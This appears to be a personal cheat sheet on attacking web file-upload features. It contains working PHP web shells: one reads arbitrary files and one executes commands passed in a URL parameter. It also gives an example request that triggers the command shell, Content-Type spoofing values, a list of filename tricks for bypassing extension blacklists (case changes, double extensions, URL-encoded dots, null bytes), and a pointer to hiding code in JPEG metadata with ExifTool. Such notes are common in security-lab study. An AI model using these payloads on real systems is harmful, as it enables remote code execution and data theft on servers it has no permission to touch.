PHP Files one line code 

<?php echo file_get_contents('/path/to/target/file'); ?> /n       //user text/plain and application/x-httpd-php  when upload the php//
<?php echo system($_GET['command']); ?>
GET /example/exploit.php?command=id HTTP/1.1     //in place id enter the command//

conent type header:
application/x-www-form-url-encoded    //for sending the simple text, HTML//
multipart/form-data     //for sending large amount of data Image, pdf//
image/jpeg  
image/png     //images conetent types//
application/x-httpd-php   

blacklistfiles bypass::
.php
.php5
.shtml
.pHp
exploit.php.jpg
exploit.php.
exploit%2Ephp (url encode for .)
exploit.asp;.jpg
exploit.asp%00.jpg
exploit.p.phphp

File Conetents:
 JPEG files always begin with the bytes FF D8 FF in the burp response body
 ExifTool, it can be trivial to create a polyglot JPEG file containing malicious code within its metadata.

 
